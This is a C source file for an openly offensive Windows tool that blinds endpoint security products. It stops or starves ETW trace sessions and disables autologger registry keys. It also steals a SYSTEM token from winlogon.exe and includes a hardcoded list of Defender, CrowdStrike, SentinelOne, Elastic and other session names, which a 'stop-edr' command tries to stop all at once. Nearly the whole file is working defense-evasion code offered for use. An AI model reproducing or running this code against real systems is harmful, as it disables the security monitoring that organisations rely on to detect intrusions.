/*
 * 21_etw_session_tamper.c
 * ETW Session Manipulation — starve EDR/AV telemetry consumers (userland, no driver)
 *
 * ── Technique overview ────────────────────────────────────────────────────────
 *
 * ETW pipeline (simplified):
 *
 *   Kernel event source (e.g. EtwTiLogReadWriteVm)
 *       │  writes to
 *       ▼
 *   ETW session buffer  (kernel-managed circular buffer)
 *       │  consumed by
 *       ▼
 *   EDR/AV consumer process (reads events, ships telemetry)
 *
 * The BYOVD approach (etw_ti_bypass.c) patches the WRITE side in ntoskrnl.
 * This tool attacks the SESSION layer — no driver, no kernel write, no PatchGuard.
 *
 * Four methods:
 *
 *   A. ControlTrace STOP   — stop the session; consumer gets no more events.
 *      Requires: SYSTEM token or session ownership.
 *      Effect:   immediate and complete.
 *
 *   B. ControlTrace UPDATE (buffer shrink) — set BufferSize=1, MinimumBuffers=1.
 *      High-volume providers overflow and drop events.
 *      Requires: same as A.
 *      Effect:   lossy, harder to detect than full stop.
 *
 *   C. Autologger registry disable — set Start=0 in autologger key.
 *      Requires: Admin (registry write to HKLM).
 *      Effect:   session does not start at next reboot. Immediate if combined with A.
 *
 *   D. SYSTEM token steal — duplicate token from winlogon.exe/lsass.exe,
 *      impersonate SYSTEM, then apply A or B on protected sessions.
 *      Requires: SeDebugPrivilege (admin).
 *      Effect:   enables A/B on sessions owned by NT AUTHORITY\SYSTEM.
 *
 * ── Applicability ─────────────────────────────────────────────────────────────
 *
 * Works against:
 *   - Microsoft Defender for Endpoint (MDE/Sense)
 *     Sessions: "Microsoft-Windows-Sense", "EventLog-Security"
 *   - Elastic Security
 *     Sessions: "Elastic*", custom session names
 *   - CrowdStrike Falcon
 *     Sessions: "CrowdStrike-Falcon-Sensor" (if present as named session)
 *   - Any EDR/AV relying on ETW-TI or custom ETW sessions for behavioral detection
 *
 * Traditional signature-based AV (e.g. old-school ClamAV, pure file-scanner):
 *   - Relies on minifilter IRP callbacks for file scan, NOT ETW
 *   - ETW session stop does NOT blind file-scan capabilities
 *   - Does blind behavioral/cloud telemetry components if they use ETW
 *
 * ── Privilege requirements ────────────────────────────────────────────────────
 *
 *   list    : no elevation required
 *   stop    : SYSTEM (use method D first if needed), or session owner
 *   shrink  : SYSTEM (same as stop)
 *   autoreg : Admin (HKLM write)
 *   steal   : Admin + SeDebugPrivilege → gives SYSTEM context for stop/shrink
 *
 * ── Build ─────────────────────────────────────────────────────────────────────
 *   cl 21_etw_session_tamper.c /link advapi32.lib sechost.lib
 *   (sechost.lib has ControlTrace on Win10+; advapi32.lib on older)
 *
 * Usage:
 *   21_etw_session_tamper.exe list
 *   21_etw_session_tamper.exe stop    <session_name>
 *   21_etw_session_tamper.exe shrink  <session_name>
 *   21_etw_session_tamper.exe autoreg <session_name>   (registry disable, needs reboot)
 *   21_etw_session_tamper.exe steal                    (get SYSTEM token, then interactive)
 *   21_etw_session_tamper.exe stop-edr                 (stop all known EDR sessions)
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <evntrace.h>
#include <tdh.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <wchar.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "sechost.lib")

/* ── Constants ──────────────────────────────────────────────────────────────── */

#define MAX_SESSIONS    64
/* Each EVENT_TRACE_PROPERTIES needs extra space for two strings appended after it */
#define PROP_BUF_SIZE   (sizeof(EVENT_TRACE_PROPERTIES) + 2 * 1024)

/* Offset of logger name string within the property buffer */
#define LOGGER_NAME_OFFSET  sizeof(EVENT_TRACE_PROPERTIES)
/* Offset of log file name string within the property buffer */
#define LOGFILE_NAME_OFFSET (sizeof(EVENT_TRACE_PROPERTIES) + 1024)

/* Known EDR/AV ETW session names — extend as needed */
static const WCHAR *EDR_SESSION_NAMES[] = {
    /* Microsoft Defender for Endpoint */
    L"Microsoft-Windows-Sense",
    L"SenseIR",
    L"EventLog-Security",           /* Windows security log — MDE relies on this */
    L"EventLog-System",
    /* Windows Defender AV */
    L"Microsoft-Antimalware-AMFilter",
    L"Microsoft-Windows-Windows Defender",
    L"WinDefend",
    /* CrowdStrike */
    L"CrowdStrike-Falcon-Sensor",
    L"csagent",
    /* SentinelOne */
    L"SentinelOne",
    L"SentinelAgent",
    /* Elastic */
    L"Elastic",
    L"elastic-agent",
    /* Carbon Black */
    L"CarbonBlack",
    L"CbDefense",
    /* Cylance */
    L"CylanceSvc",
    /* Generic high-value kernel sessions */
    L"NT Kernel Logger",            /* Requires SYSTEM */
    L"Circular Kernel Context Logger",
    NULL
};

/* Autologger registry base */
#define AUTOLOGGER_BASE \
    L"SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger"

/* ── Property buffer helpers ────────────────────────────────────────────────── */

static PEVENT_TRACE_PROPERTIES AllocProp(void)
{
    BYTE *buf = (BYTE *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, PROP_BUF_SIZE);
    if (!buf) return NULL;

    PEVENT_TRACE_PROPERTIES p = (PEVENT_TRACE_PROPERTIES)buf;
    p->Wnode.BufferSize  = PROP_BUF_SIZE;
    p->LoggerNameOffset  = (ULONG)LOGGER_NAME_OFFSET;
    p->LogFileNameOffset = (ULONG)LOGFILE_NAME_OFFSET;
    return p;
}

static void FreeProp(PEVENT_TRACE_PROPERTIES p)
{
    if (p) HeapFree(GetProcessHeap(), 0, p);
}

static WCHAR *PropLoggerName(PEVENT_TRACE_PROPERTIES p)
{
    return (WCHAR *)((BYTE *)p + p->LoggerNameOffset);
}

/* ── Privilege helpers ──────────────────────────────────────────────────────── */

static BOOL EnablePrivilege(const WCHAR *privName)
{
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;

    LUID luid;
    if (!LookupPrivilegeValueW(NULL, privName, &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    TOKEN_PRIVILEGES tp = {0};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL ok = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    ok = ok && (GetLastError() == ERROR_SUCCESS);
    CloseHandle(hToken);
    return ok;
}

/* ── Method D: steal SYSTEM token from a SYSTEM process ────────────────────── */
/*
 * Finds winlogon.exe (always SYSTEM), duplicates its primary token,
 * then impersonates SYSTEM. After impersonation, ControlTrace calls on
 * system-owned sessions will succeed.
 *
 * Returns TRUE on success. Call RevertToSelf() when done.
 */
static BOOL StealSystemToken(void)
{
    EnablePrivilege(SE_DEBUG_NAME);

    /* Find a SYSTEM-owned process (winlogon is reliable) */
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        wprintf(L"[-] CreateToolhelp32Snapshot: %lu\n", GetLastError());
        return FALSE;
    }

    PROCESSENTRY32W pe = { sizeof(pe) };
    DWORD targetPid = 0;

    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"winlogon.exe") == 0) {
                targetPid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);

    if (!targetPid) {
        wprintf(L"[-] winlogon.exe not found\n");
        return FALSE;
    }

    wprintf(L"[D] winlogon.exe PID=%lu\n", targetPid);

    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, targetPid);
    if (!hProc) {
        wprintf(L"[-] OpenProcess(winlogon): %lu\n", GetLastError());
        return FALSE;
    }

    HANDLE hToken = NULL;
    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
        wprintf(L"[-] OpenProcessToken: %lu\n", GetLastError());
        CloseHandle(hProc);
        return FALSE;
    }
    CloseHandle(hProc);

    /* Duplicate as impersonation token */
    HANDLE hDup = NULL;
    BOOL ok = DuplicateToken(hToken, SecurityImpersonation, &hDup);
    CloseHandle(hToken);

    if (!ok) {
        wprintf(L"[-] DuplicateToken: %lu\n", GetLastError());
        return FALSE;
    }

    ok = SetThreadToken(NULL, hDup);
    CloseHandle(hDup);

    if (!ok) {
        wprintf(L"[-] SetThreadToken: %lu\n", GetLastError());
        return FALSE;
    }

    wprintf(L"[D] Impersonating SYSTEM\n");
    return TRUE;
}

/* ── Method A: ControlTrace STOP ───────────────────────────────────────────── */

static BOOL StopSession(const WCHAR *name)
{
    PEVENT_TRACE_PROPERTIES p = AllocProp();
    if (!p) return FALSE;

    ULONG err = ControlTraceW(0, name, p, EVENT_TRACE_CONTROL_STOP);

    if (err == ERROR_SUCCESS) {
        wprintf(L"  [+] STOPPED: %s\n", name);
        FreeProp(p);
        return TRUE;
    }

    if (err == ERROR_WMI_INSTANCE_NOT_FOUND) {
        wprintf(L"  [~] Not running: %s\n", name);
        FreeProp(p);
        return FALSE;
    }

    wprintf(L"  [-] ControlTrace(STOP) '%s': error %lu", name, err);
    if (err == ERROR_ACCESS_DENIED)
        wprintf(L" (Access denied — need SYSTEM, try 'steal' first)");
    wprintf(L"\n");

    FreeProp(p);
    return FALSE;
}

/* ── Method B: ControlTrace UPDATE — shrink buffers to cause event loss ─────── */
/*
 * Sets BufferSize=1 (1KB, minimum), MinimumBuffers=1, MaximumBuffers=2.
 * The session's circular buffer fills up instantly under any moderate event load.
 * New events are dropped silently — EDR consumer receives incomplete telemetry.
 *
 * Less obvious than a full STOP: the session remains "running" in tasklist/ETW
 * enumeration, but is functionally starved.
 */
static BOOL ShrinkSession(const WCHAR *name)
{
    /* First query to get current state */
    PEVENT_TRACE_PROPERTIES pQuery = AllocProp();
    if (!pQuery) return FALSE;

    ULONG err = ControlTraceW(0, name, pQuery, EVENT_TRACE_CONTROL_QUERY);
    if (err != ERROR_SUCCESS) {
        wprintf(L"  [-] Query '%s': %lu\n", name, err);
        FreeProp(pQuery);
        return FALSE;
    }

    wprintf(L"  [*] Current: BufferSize=%luKB  MinBuffers=%lu  MaxBuffers=%lu  BuffersWritten=%lu\n",
            pQuery->BufferSize,
            pQuery->MinimumBuffers,
            pQuery->MaximumBuffers,
            pQuery->BuffersWritten);

    FreeProp(pQuery);

    /* Now update with minimum buffer configuration */
    PEVENT_TRACE_PROPERTIES pUpd = AllocProp();
    if (!pUpd) return FALSE;

    pUpd->BufferSize      = 1;    /* 1 KB — absolute minimum */
    pUpd->MinimumBuffers  = 1;
    pUpd->MaximumBuffers  = 2;
    /* Keep LogFileMode from current session — don't change it */

    err = ControlTraceW(0, name, pUpd, EVENT_TRACE_CONTROL_UPDATE);
    if (err == ERROR_SUCCESS) {
        wprintf(L"  [+] SHRUNK: %s → BufferSize=1KB, MinBuf=1, MaxBuf=2\n", name);
        wprintf(L"      Session still running but will drop most events\n");
        FreeProp(pUpd);
        return TRUE;
    }

    wprintf(L"  [-] ControlTrace(UPDATE) '%s': %lu", name, err);
    if (err == ERROR_ACCESS_DENIED)
        wprintf(L" (need SYSTEM)");
    wprintf(L"\n");

    FreeProp(pUpd);
    return FALSE;
}

/* ── Method C: autologger registry disable ──────────────────────────────────── */
/*
 * ETW autologger sessions are configured in the registry and start automatically
 * at boot. Setting Start=0 prevents the session from restarting after reboot.
 * Combine with Method A (STOP) for immediate + persistent effect.
 */
static BOOL DisableAutologger(const WCHAR *sessionName)
{
    WCHAR keyPath[512] = {0};
    _snwprintf_s(keyPath, ARRAYSIZE(keyPath), _TRUNCATE,
                 L"%s\\%s", AUTOLOGGER_BASE, sessionName);

    HKEY hKey = NULL;
    LONG err = RegOpenKeyExW(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_WRITE, &hKey);
    if (err != ERROR_SUCCESS) {
        if (err == ERROR_FILE_NOT_FOUND)
            wprintf(L"  [~] Autologger key not found: %s (not an autologger session)\n",
                    sessionName);
        else
            wprintf(L"  [-] RegOpenKeyExW: %ld\n", err);
        return FALSE;
    }

    /* Read current Start value for display */
    DWORD startVal = 0;
    DWORD valSize  = sizeof(startVal);
    RegQueryValueExW(hKey, L"Start", NULL, NULL, (BYTE *)&startVal, &valSize);
    wprintf(L"  [*] Current Start=%lu\n", startVal);

    /* Set Start=0 to disable autostart */
    DWORD zero = 0;
    err = RegSetValueExW(hKey, L"Start", 0, REG_DWORD, (BYTE *)&zero, sizeof(zero));
    RegCloseKey(hKey);

    if (err == ERROR_SUCCESS) {
        wprintf(L"  [+] Autologger '%s': Start set to 0 (disabled on next reboot)\n",
                sessionName);
        wprintf(L"      Combine with 'stop' for immediate effect.\n");
        return TRUE;
    }

    wprintf(L"  [-] RegSetValueExW: %ld\n", err);
    return FALSE;
}

/* Restore autologger to Start=1 */
static void RestoreAutologger(const WCHAR *sessionName)
{
    WCHAR keyPath[512] = {0};
    _snwprintf_s(keyPath, ARRAYSIZE(keyPath), _TRUNCATE,
                 L"%s\\%s", AUTOLOGGER_BASE, sessionName);

    HKEY hKey = NULL;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_WRITE, &hKey) != ERROR_SUCCESS)
        return;

    DWORD one = 1;
    RegSetValueExW(hKey, L"Start", 0, REG_DWORD, (BYTE *)&one, sizeof(one));
    RegCloseKey(hKey);
    wprintf(L"  [+] Autologger '%s': Start restored to 1\n", sessionName);
}

/* ── Session enumeration ────────────────────────────────────────────────────── */

static void ListSessions(void)
{
    /* Allocate array of property pointers */
    PEVENT_TRACE_PROPERTIES props[MAX_SESSIONS];
    for (int i = 0; i < MAX_SESSIONS; i++) {
        props[i] = AllocProp();
        if (!props[i]) {
            wprintf(L"[-] Allocation failed at index %d\n", i);
            for (int j = 0; j < i; j++) FreeProp(props[j]);
            return;
        }
    }

    ULONG count = MAX_SESSIONS;
    ULONG err   = QueryAllTracesW(props, MAX_SESSIONS, &count);

    if (err != ERROR_SUCCESS && err != ERROR_MORE_DATA) {
        wprintf(L"[-] QueryAllTraces: %lu\n", err);
        for (int i = 0; i < MAX_SESSIONS; i++) FreeProp(props[i]);
        return;
    }

    wprintf(L"\n  %-48s  %8s  %8s  %8s  %s\n",
            L"Session Name", L"BufSzKB", L"MinBuf", L"MaxBuf", L"Flags");
    wprintf(L"  %-48s  %8s  %8s  %8s  %s\n",
            L"------------------------------------------------",
            L"--------", L"--------", L"--------", L"-----");

    for (ULONG i = 0; i < count; i++) {
        WCHAR *name = PropLoggerName(props[i]);

        /* Flag EDR-related sessions */
        BOOL isEdr = FALSE;
        for (int j = 0; EDR_SESSION_NAMES[j] != NULL; j++) {
            if (_wcsicmp(name, EDR_SESSION_NAMES[j]) == 0 ||
                wcsstr(name, L"Sense")      != NULL ||
                wcsstr(name, L"Defender")   != NULL ||
                wcsstr(name, L"CrowdStrike")!= NULL ||
                wcsstr(name, L"Sentinel")   != NULL ||
                wcsstr(name, L"Elastic")    != NULL ||
                wcsstr(name, L"Carbon")     != NULL ||
                wcsstr(name, L"Cylance")    != NULL ||
                wcsstr(name, L"Malware")    != NULL)
            {
                isEdr = TRUE;
                break;
            }
        }

        wprintf(L"  %-48s  %8lu  %8lu  %8lu  %s\n",
                name,
                props[i]->BufferSize,
                props[i]->MinimumBuffers,
                props[i]->MaximumBuffers,
                isEdr ? L"<<< EDR/AV" : L"");
    }

    wprintf(L"\n  Total sessions: %lu\n", count);

    for (int i = 0; i < MAX_SESSIONS; i++) FreeProp(props[i]);
}

/* ── List autologger sessions in registry ───────────────────────────────────── */

static void ListAutologgers(void)
{
    HKEY hBase = NULL;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, AUTOLOGGER_BASE, 0,
                      KEY_READ, &hBase) != ERROR_SUCCESS) {
        wprintf(L"[-] Cannot open Autologger registry key\n");
        return;
    }

    wprintf(L"\n  Autologger sessions (HKLM\\...\\WMI\\Autologger):\n\n");
    wprintf(L"  %-48s  %s\n", L"Session Name", L"Start");
    wprintf(L"  %-48s  %s\n",
            L"------------------------------------------------", L"-----");

    WCHAR subName[256];
    DWORD subLen = ARRAYSIZE(subName);
    DWORD idx    = 0;

    while (RegEnumKeyExW(hBase, idx, subName, &subLen,
                         NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
    {
        HKEY hSub = NULL;
        DWORD startVal = 0xFF;
        DWORD valSize  = sizeof(startVal);

        if (RegOpenKeyExW(hBase, subName, 0, KEY_READ, &hSub) == ERROR_SUCCESS) {
            RegQueryValueExW(hSub, L"Start", NULL, NULL,
                             (BYTE *)&startVal, &valSize);
            RegCloseKey(hSub);
        }

        BOOL isEdr = (wcsstr(subName, L"Sense")       != NULL ||
                      wcsstr(subName, L"Defender")     != NULL ||
                      wcsstr(subName, L"CrowdStrike")  != NULL ||
                      wcsstr(subName, L"Sentinel")     != NULL ||
                      wcsstr(subName, L"Elastic")      != NULL ||
                      wcsstr(subName, L"Malware")      != NULL ||
                      wcsstr(subName, L"Threat")       != NULL);

        wprintf(L"  %-48s  %lu  %s\n",
                subName, startVal, isEdr ? L"<<< EDR/AV" : L"");

        idx++;
        subLen = ARRAYSIZE(subName);
    }

    RegCloseKey(hBase);
}

/* ── stop-edr: stop all known EDR sessions ──────────────────────────────────── */

static void StopAllEdrSessions(void)
{
    wprintf(L"\n[*] Attempting to stop all known EDR/AV ETW sessions...\n\n");

    /* First try to get SYSTEM token — needed for most system-owned sessions */
    BOOL hasSystem = StealSystemToken();
    if (!hasSystem)
        wprintf(L"[!] SYSTEM impersonation failed — stop may fail for system-owned sessions\n\n");

    int stopped = 0;
    for (int i = 0; EDR_SESSION_NAMES[i] != NULL; i++) {
        if (StopSession(EDR_SESSION_NAMES[i]))
            stopped++;
    }

    if (hasSystem) RevertToSelf();

    wprintf(L"\n[*] Stopped %d session(s)\n", stopped);
    wprintf(L"[*] Use 'autoreg <name>' to also disable autologger restart\n");
}

/* ── main ────────────────────────────────────────────────────────────────────── */

int wmain(int argc, wchar_t *argv[])
{
    wprintf(L"[*] ETW Session Tamper Tool\n");
    wprintf(L"    Attacks EDR/AV telemetry at the session layer (no driver needed)\n\n");

    if (argc < 2) {
        wprintf(L"Usage:\n");
        wprintf(L"  %s list                  List all running ETW sessions\n", argv[0]);
        wprintf(L"  %s autologgers            List autologger registry sessions\n", argv[0]);
        wprintf(L"  %s stop    <name>         Stop a session (needs SYSTEM for most)\n", argv[0]);
        wprintf(L"  %s shrink  <name>         Shrink buffers -> event loss (needs SYSTEM)\n", argv[0]);
        wprintf(L"  %s autoreg <name>         Disable autologger at registry (admin, reboot)\n", argv[0]);
        wprintf(L"  %s restore-autoreg <name> Re-enable autologger at registry\n", argv[0]);
        wprintf(L"  %s steal                  Steal SYSTEM token, then use stop/shrink\n", argv[0]);
        wprintf(L"  %s stop-edr               Stop all known EDR/AV sessions\n\n", argv[0]);
        wprintf(L"Notes:\n");
        wprintf(L"  stop/shrink on system-owned sessions requires SYSTEM token.\n");
        wprintf(L"  Run 'steal' interactively or combine: steal + stop.\n");
        wprintf(L"  autoreg is persistent (reboot required) but works as admin only.\n");
        return 1;
    }

    /* Enable profile privilege — needed for QueryAllTraces and ControlTrace */
    if (!EnablePrivilege(SE_SYSTEM_PROFILE_NAME))
        wprintf(L"[!] SeSystemProfilePrivilege not available — some operations may fail\n\n");

    if (_wcsicmp(argv[1], L"list") == 0) {
        wprintf(L"[*] Running ETW sessions:\n");
        ListSessions();
        return 0;
    }

    if (_wcsicmp(argv[1], L"autologgers") == 0) {
        ListAutologgers();
        return 0;
    }

    if (_wcsicmp(argv[1], L"stop") == 0 && argc >= 3) {
        wprintf(L"[A] Stopping session: %s\n", argv[2]);
        StopSession(argv[2]);
        return 0;
    }

    if (_wcsicmp(argv[1], L"shrink") == 0 && argc >= 3) {
        wprintf(L"[B] Shrinking session buffers: %s\n", argv[2]);
        ShrinkSession(argv[2]);
        return 0;
    }

    if (_wcsicmp(argv[1], L"autoreg") == 0 && argc >= 3) {
        wprintf(L"[C] Disabling autologger: %s\n", argv[2]);
        DisableAutologger(argv[2]);
        return 0;
    }

    if (_wcsicmp(argv[1], L"restore-autoreg") == 0 && argc >= 3) {
        wprintf(L"[C] Restoring autologger: %s\n", argv[2]);
        RestoreAutologger(argv[2]);
        return 0;
    }

    if (_wcsicmp(argv[1], L"steal") == 0) {
        wprintf(L"[D] Stealing SYSTEM token...\n\n");
        if (StealSystemToken()) {
            wprintf(L"\n[+] Now running with SYSTEM impersonation token.\n");
            wprintf(L"    Re-run with 'stop <name>' or 'shrink <name>'.\n");
            wprintf(L"    (This instance has the token — run further commands from this process)\n");
            /* Interactive loop so the impersonation context persists */
            wprintf(L"\n    Commands: stop <name> | shrink <name> | list | quit\n\n");
            WCHAR line[512];
            while (TRUE) {
                wprintf(L"SYSTEM> ");
                fflush(stdout);
                if (!fgetws(line, ARRAYSIZE(line), stdin)) break;
                /* trim newline */
                line[wcscspn(line, L"\r\n")] = L'\0';

                if (_wcsicmp(line, L"quit") == 0 || _wcsicmp(line, L"exit") == 0) break;
                if (_wcsicmp(line, L"list") == 0) { ListSessions(); continue; }

                WCHAR cmd[64] = {0}, arg[448] = {0};
                if (swscanf_s(line, L"%63s %447s", cmd, 64, arg, 448) >= 2) {
                    if (_wcsicmp(cmd, L"stop")   == 0) StopSession(arg);
                    if (_wcsicmp(cmd, L"shrink") == 0) ShrinkSession(arg);
                    if (_wcsicmp(cmd, L"autoreg")== 0) DisableAutologger(arg);
                } else {
                    wprintf(L"  ? Unknown: %s\n", line);
                }
            }
            RevertToSelf();
            wprintf(L"\n[D] Reverted to original token.\n");
        }
        return 0;
    }

    if (_wcsicmp(argv[1], L"stop-edr") == 0) {
        StopAllEdrSessions();
        return 0;
    }

    wprintf(L"[-] Unknown command: %s\n", argv[1]);
    return 1;
}
